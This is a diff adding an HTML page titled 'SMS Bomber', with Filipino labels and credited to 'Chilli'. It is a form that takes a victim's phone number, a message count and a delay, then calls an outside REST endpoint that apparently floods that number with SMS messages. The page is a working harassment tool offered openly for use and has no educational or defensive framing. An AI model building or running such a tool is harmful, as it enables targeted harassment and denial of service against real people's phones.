@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SMS Bomber</title>
+    <style>
+        body {
+            font-family: 'Helvetica Neue', Arial, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            color: #fff;
+        }
+        .container {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+            text-align: center;
+            width: 100%;
+            max-width: 400px;
+        }
+        .container h1 {
+            margin-bottom: 20px;
+            color: #fff;
+            font-size: 24px;
+            font-weight: bold;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+        .input-group {
+            margin-bottom: 20px;
+            text-align: left;
+        }
+        .input-group label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+        .input-group input {
+            width: 100%;
+            padding: 10px;
+            box-sizing: border-box;
+            border: none;
+            border-radius: 5px;
+            outline: none;
+            transition: transform 0.3s;
+        }
+        .input-group input:focus {
+            transform: scale(1.05);
+        }
+        .button {
+            display: block;
+            width: 100%;
+            padding: 12px;
+            background: #007BFF;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            transition: background-color 0.3s, transform 0.3s;
+        }
+        .button:hover {
+            background-color: #0056b3;
+            transform: scale(1.05);
+        }
+        .button:active {
+            transform: scale(0.95);
+        }
+        #response {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #fff;
+        }
+        #datetime {
+            margin-bottom: 20px;
+            font-size: 14px;
+            color: #ccc;
+        }
+        footer {
+            margin-top: 20px;
+            font-size: 14px;
+            color: #ccc;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div id="datetime"></div>
+        <h1>SMS Bomber</h1>
+        <div class="input-group">
+            <label for="phone">Number ng gusto mong i-bomb  ya</label>
+            <input type="text" id="phone" name="phone">
+        </div>
+        <div class="input-group">
+            <label for="amount">Enter the amount</label>
+            <input type="number" id="amount" name="amount">
+        </div>
+        <div class="input-group">
+            <label for="cooldown">Enter the cooldown (per second)</label>
+            <input type="number" id="cooldown" name="cooldown">
+        </div>
+        <button class="button" onclick="startBombing()">Start Bombing</button>
+        <div id="response"></div>
+        <footer>This SMS Bomb was created by Chilli</footer>
+    </div>
+
+    <script>
+        function updateDateTime() {
+            const now = new Date();
+            const dateTimeStr = now.toLocaleString('en-US', { hour12: false });
+            document.getElementById('datetime').innerHTML = dateTimeStr;
+        }
+        setInterval(updateDateTime, 1000);
+
+        function startBombing() {
+            const phone = document.getElementById('phone').value;
+            const amount = document.getElementById('amount').value;
+            const cooldown = document.getElementById('cooldown').value;
+            const responseDiv = document.getElementById('response');
+
+            if (phone === '' || amount === '' || cooldown === '') {
+                responseDiv.innerHTML = 'Please fill out all fields';
+                return;
+            }
+
+            fetch(`https://deku-rest-api-ywad.onrender.com/smsb?number=${phone}&amount=${amount}&delay=${cooldown}`)
+                .then(response => response.json())
+                .then(data => {
+                    responseDiv.innerHTML = 'SMS bombing started!';
+                })
+                .catch(error => {
+                    responseDiv.innerHTML = 'Error starting SMS bombing';
+                    console.error('Error:', error);
+                });
+        }
+
+        updateDateTime();
+    </script>
+</body>
+</html>
